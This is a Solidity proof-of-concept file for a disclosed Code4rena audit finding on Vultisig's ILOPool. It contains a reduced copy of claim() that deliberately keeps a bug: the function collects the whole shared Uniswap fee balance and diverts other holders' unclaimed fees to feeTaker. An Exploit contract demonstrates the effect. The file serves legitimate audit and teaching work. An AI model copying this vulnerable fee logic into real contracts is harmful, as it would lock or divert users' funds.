// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Vultisig — most users won't be able to claim their share of Uniswap fees
    Finding 35753 (Ryonen, Code4rena 2024-06-vultisig) — HIGH (H-01)

    Root cause: ILOPool.claim() computes the CALLING position's own fair
    share of accumulated Uniswap V3 fees (via feeGrowthInside deltas), but
    then collects the pool's ENTIRE available fee balance in one shot
    (`type(uint128).max`) and forwards the excess -- which includes every
    OTHER not-yet-claimed position's still-unclaimed fees -- to a fixed
    `feeTaker`. The first position to call claim() after fees accrue walks
    away with its own share; the pool is left holding nothing. The next
    position's claim() computes a nonzero fair share (their feeGrowthInside
    delta is real) but the safeTransfer to pay it out reverts with "ST"
    because the contract's own token balance is now zero -- permanently.

    This file is a self-contained, cheatcode-free reduction. `claim()`'s
    fee-collection block is preserved verbatim (the `pool.collect(...,
    type(uint128).max, type(uint128).max)` call and the two
    `TransferHelper.safeTransfer(..., feeTaker, amountCollected - amount)`
    lines), from `code-423n4/2024-06-vultisig@befb1b1`, `src/ILOPool.sol`.
    The liquidity-burn/vesting/platform-fee machinery (irrelevant to this
    bug -- it is purely about the shared fee pot) is dropped; each NFT
    position keeps a fixed liquidity share and its own feeGrowthInside
    snapshot, exactly mirroring the real accounting this bug exploits.
//////////////////////////////////////////////////////////////////////////*/

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

/// @dev Verbatim pattern from Uniswap v3-periphery's TransferHelper: converts
///      any transfer failure into a revert with reason "ST" (matches the
///      finding's own `vm.expectRevert(bytes("ST"))`).
library TransferHelper {
    function safeTransfer(address token, address to, uint256 value) internal {
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(IERC20.transfer.selector, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), "ST");
    }
}

contract MockToken is IERC20 {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt; // underflows/reverts on insufficient balance
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Reduced Uniswap V3 pool: only the fee-accounting surface ILOPool.claim()
///         actually touches. `feeGrowthInside` is shared by BOTH NFT positions,
///         exactly like the real pool (both positions occupy the SAME tick range,
///         so `PositionKey.compute(address(ILOPool), TICK_LOWER, TICK_UPPER)` is
///         identical for both -- there is only one underlying Uniswap position).
contract MockUniV3Pool {
    IERC20 public token0;
    IERC20 public token1;

    uint256 public feeGrowthInside0X128;
    uint256 public feeGrowthInside1X128;
    uint128 public availableFees0;
    uint128 public availableFees1;

    uint256 internal constant Q128 = 2 ** 128;

    constructor(IERC20 _token0, IERC20 _token1) {
        token0 = _token0;
        token1 = _token1;
    }

    /// @dev Stand-in for a swap/flash generating real Uniswap V3 fees: fees
    ///      accrue to `feeGrowthInside` proportional to 1/totalLiquidity, and
    ///      become available for `collect()`.
    function generateFees(uint256 fee0, uint256 fee1, uint256 totalLiquidity) external {
        MockToken(address(token0)).mint(address(this), fee0);
        MockToken(address(token1)).mint(address(this), fee1);
        feeGrowthInside0X128 += (fee0 * Q128) / totalLiquidity;
        feeGrowthInside1X128 += (fee1 * Q128) / totalLiquidity;
        availableFees0 += uint128(fee0);
        availableFees1 += uint128(fee1);
    }

    function feeGrowthInside() external view returns (uint256, uint256) {
        return (feeGrowthInside0X128, feeGrowthInside1X128);
    }

    /// @dev Verbatim signature/behavior of `IUniswapV3Pool.collect`: pays out
    ///      up to `amount0Max`/`amount1Max` of whatever fees are CURRENTLY
    ///      available in the shared tick range, regardless of which position
    ///      earned them.
    function collect(address recipient, int24, int24, uint128 amount0Max, uint128 amount1Max)
        external
        returns (uint128 amountCollected0, uint128 amountCollected1)
    {
        amountCollected0 = amount0Max < availableFees0 ? amount0Max : availableFees0;
        amountCollected1 = amount1Max < availableFees1 ? amount1Max : availableFees1;
        availableFees0 -= amountCollected0;
        availableFees1 -= amountCollected1;
        if (amountCollected0 > 0) TransferHelper.safeTransfer(address(token0), recipient, amountCollected0);
        if (amountCollected1 > 0) TransferHelper.safeTransfer(address(token1), recipient, amountCollected1);
    }
}

/// @notice Reduced ILOPool. Vesting/burn/platform-fee bookkeeping is dropped;
///         only the fee-claim path (the vulnerable one) remains.
contract ILOPool {
    struct Position {
        uint128 liquidity;
        uint256 feeGrowthInside0LastX128;
        uint256 feeGrowthInside1LastX128;
    }

    MockUniV3Pool public pool;
    IERC20 public token0;
    IERC20 public token1;
    address public feeTaker;
    int24 public constant TICK_LOWER = -100;
    int24 public constant TICK_UPPER = 100;

    mapping(uint256 => Position) internal _positions;
    mapping(uint256 => address) public ownerOf;

    uint256 internal constant Q128 = 2 ** 128;

    constructor(MockUniV3Pool _pool, IERC20 _token0, IERC20 _token1, address _feeTaker) {
        pool = _pool;
        token0 = _token0;
        token1 = _token1;
        feeTaker = _feeTaker;
    }

    /// @dev Harness-only setup (not part of the vulnerable logic): mints an
    ///      NFT-style position with a fixed liquidity share, mirroring the
    ///      finding's PoC where INVESTOR/INVESTOR_2 each hold an ILOPool
    ///      position over the same tick range.
    function setPosition(uint256 tokenId, address owner, uint128 liquidity) external {
        ownerOf[tokenId] = owner;
        _positions[tokenId].liquidity = liquidity;
    }

    /// @dev Verbatim fee-claim block from `ILOPool.claim`,
    ///      code-423n4/2024-06-vultisig commit befb1b1, `src/ILOPool.sol` L242-L260
    ///      (the liquidity-burn/vesting/platform-fee lines around it are
    ///      dropped as irrelevant to this bug -- see file header).
    function claim(uint256 tokenId) external virtual returns (uint256 amount0, uint256 amount1) {
        Position storage position = _positions[tokenId];
        uint128 positionLiquidity = position.liquidity;

        (uint256 feeGrowthInside0LastX128, uint256 feeGrowthInside1LastX128) = pool.feeGrowthInside();
        uint256 fees0 = ((feeGrowthInside0LastX128 - position.feeGrowthInside0LastX128) * positionLiquidity) / Q128;
        uint256 fees1 = ((feeGrowthInside1LastX128 - position.feeGrowthInside1LastX128) * positionLiquidity) / Q128;
        amount0 = fees0;
        amount1 = fees1;

        position.feeGrowthInside0LastX128 = feeGrowthInside0LastX128;
        position.feeGrowthInside1LastX128 = feeGrowthInside1LastX128;

        // real amount collected from uintswap pool
        // @> VULN: collects the ENTIRE available fee balance for the shared tick
        // range at once, not just this position's own computed share `amount0/1` --
        // draining fees still owed to every OTHER not-yet-claimed position.
        (uint128 amountCollected0, uint128 amountCollected1) =
            pool.collect(address(this), TICK_LOWER, TICK_UPPER, type(uint128).max, type(uint128).max);

        TransferHelper.safeTransfer(address(token0), ownerOf[tokenId], amount0);
        TransferHelper.safeTransfer(address(token1), ownerOf[tokenId], amount1);

        // transfer fee to fee taker -- this is the OTHER positions' still-unclaimed share
        TransferHelper.safeTransfer(address(token0), feeTaker, amountCollected0 - amount0);
        TransferHelper.safeTransfer(address(token1), feeTaker, amountCollected1 - amount1);
    }
}

contract Exploit {
    MockToken public token0; // CREATE nonce 1
    MockToken public token1; // CREATE nonce 2
    MockUniV3Pool public pool; // CREATE nonce 3
    ILOPool public iloPool; // CREATE nonce 4 -- vulnerable

    address public investor1 = address(0xA11CE1);
    address public investor2 = address(0xA11CE2);
    address public feeTaker = address(0xFEE7A2);

    constructor() {
        token0 = new MockToken();
        token1 = new MockToken();
        pool = new MockUniV3Pool(token0, token1);
        iloPool = new ILOPool(pool, token0, token1, feeTaker);

        iloPool.setPosition(1, investor1, 1024);
        iloPool.setPosition(2, investor2, 1024);
    }

    function run() external {
        // Both investors hold an equal, fixed liquidity share (1000 each).
        // A flash swap generates 200 units of fees in each token, split
        // evenly by liquidity: 100 for investor1, 100 for investor2.
        pool.generateFees(200, 200, 2048);

        (uint256 a0, uint256 a1) = iloPool.claim(1);
        require(a0 == 100 && a1 == 100, "unexpected computed share for investor1");
        require(token0.balanceOf(investor1) == 100, "investor1 did not receive their fair share");
        // VULN effect: feeTaker received investor2's still-unclaimed share too.
        require(token0.balanceOf(feeTaker) == 100, "harm not demonstrated: feeTaker did not receive diverted fees");

        // investor2's fair share (100/100) is real and correctly computed --
        // but the pool has nothing left to pay it out with.
        (bool ok,) = address(iloPool).call(abi.encodeWithSelector(ILOPool.claim.selector, uint256(2)));
        require(!ok, "harm not demonstrated: investor2's claim unexpectedly succeeded");
        require(token0.balanceOf(investor2) == 0, "harm not demonstrated: investor2 received fees despite revert");
    }
}
